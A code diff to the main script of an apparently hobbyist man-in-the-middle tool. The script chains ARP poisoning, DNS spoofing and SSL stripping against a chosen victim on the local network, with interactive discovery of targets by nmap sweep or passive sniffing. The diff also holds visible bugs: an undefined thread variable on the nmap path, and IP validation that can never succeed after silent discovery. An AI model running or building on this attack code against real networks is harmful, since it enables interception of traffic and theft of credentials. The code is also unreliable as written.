@@ -2,10 +2,10 @@ from arp_poisoning import ARPPoison
 from dns_spoofing import DNSSpoof
 from dns_learner import DNSLearner
 from ssl_stripping import SSLStrip
+from silent_discovery import Silent
 
 import argparse
 import scapy.all as scapy
-import scapy.arch as scarch
 import logging
 import threading
 import time
@@ -60,7 +60,7 @@ def parse_args():
             missing.append("-w/--website")
 
         if missing:
-            parser.error(f"Missing required arguments: {', '.join(missing)} (or use -i)")
+            parser.error(f"! Missing required arguments: {', '.join(missing)} (or use -i)")
 
     return args
 
@@ -68,23 +68,58 @@ def setup():
     args = parse_args()
 
     if args.interactive:
-        ifaces = scarch.get_if_list()
-        print(f"Available interfaces: {ifaces}")
-        args.interface = input("> Interface: ").strip()
+        try:
+            ifaces = scapy.get_if_list()
+            print(f"Available interfaces: {ifaces}")
+            args.interface = input("> Choose an interface: ").strip()
+            while args.interface not in ifaces:
+                print(f"! Invalid interface. Please choose an interface from the following list: {ifaces}")
+                args.interface = input("> Choose an interface: ").strip()
 
-        probe = input("> Probe subnet for available victims [y/n]? ").strip().lower()
-        if probe == "y" or probe == "yes":
-            nm = nmap.PortScanner()
-            nm.scan(f"{scarch.get_if_addr(args.interface)}/24", arguments="-sP")
-            print(f"Detected victims: {nm.all_hosts()}")
+            probe = input("> Probe subnet for available targets? [y/n] ").strip().lower()
+            if probe == "y" or probe == "yes":
+                nm = nmap.PortScanner()
+                nm.scan(f"{scapy.get_if_addr(args.interface)}/24", arguments="-sP")
+                print(f"Detected targets: {nm.all_hosts()}")
+                targets = nm.all_hosts()
+            else:
+                targets = []
+                stop_silent = threading.Event()
+                silent = Silent(args.interface)
+                silent_thread = threading.Thread(
+                    target=silent.discover,
+                    args=(stop_silent,)
+                )
+                silent_thread.start()
 
-        args.target = input("> Victim IP address: ").strip()
-        args.website = input("> Website IP address: ").strip()
-        args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
+            while True:
+                check = input("Detecting hosts silently. Type 'done' to continue.").strip().lower()
+                if check == 'done':
+                    if silent_thread.is_alive():
+                        stop_silent.set()
+                        silent_thread.join()
+                    break
 
-        if not 1 <= args.aggressiveness <= 10:
-            print("error: Aggressiveness must be between 1 and 10")
-            exit(1)
+            args.target = input("> Input the victim IP address: ").strip()
+            while args.target not in targets:
+                print(f"! Invalid IP. Please choose an IP from the following list: {targets}")
+                args.target = input("> Input the victim IP address: ").strip()
+
+            args.website = input("> Input the website IP address: ").strip()
+            while args.website not in targets:
+                print(f"! Invalid IP. Please choose an IP from the following list: {targets}")
+                args.website = input("> Input the website IP address: ").strip()
+
+            args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
+            while not 1 <= args.aggressiveness <= 10:
+                print("! Invalid number. Aggressiveness must be between 1 and 10")
+                args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
+        except KeyboardInterrupt:
+            print("\nAborted. Exiting...")
+            if silent_thread.is_alive():
+                stop_silent.set()
+                silent_thread.join()
+            exit(0)
 
     return (
         args.interface,
@@ -111,7 +146,7 @@ def run(iface, victim, site, timer):
     )
 
     # Spoof DNS in a separate thread
-    dns_spoofer = DNSSpoof(iface, victim, site)
+    dns_spoofer = DNSSpoof(iface, victim)
     dns_sniff_thread = threading.Thread(
         target=dns_spoofer.start,
         args=(stop_event,)
@@ -145,16 +180,14 @@ def run(iface, victim, site, timer):
 
         dns_spoofer.disable_dns_block()
 
-        restore = input("Restore ARP tables [y/n]? ").strip().lower()
+        restore = input("Restore ARP tables? [y/n] ").strip().lower()
         if restore == "y" or restore == "yes":
             arp.restore_tables(arp.victimIP, arp.websiteIP, arp.victimMAC, arp.websiteMAC)
-
             if arp.dnsIP:
                 arp.restore_tables(arp.victimIP, arp.dnsIP, arp.victimMAC, arp.dnsMAC)
-
             print("ARP tables were restored. Exiting...")
         else:
-            print("ARP tables were not restored. Exiting...")
+            print("ARP tables left spoofed. Exiting...")
 
         exit(0)
 
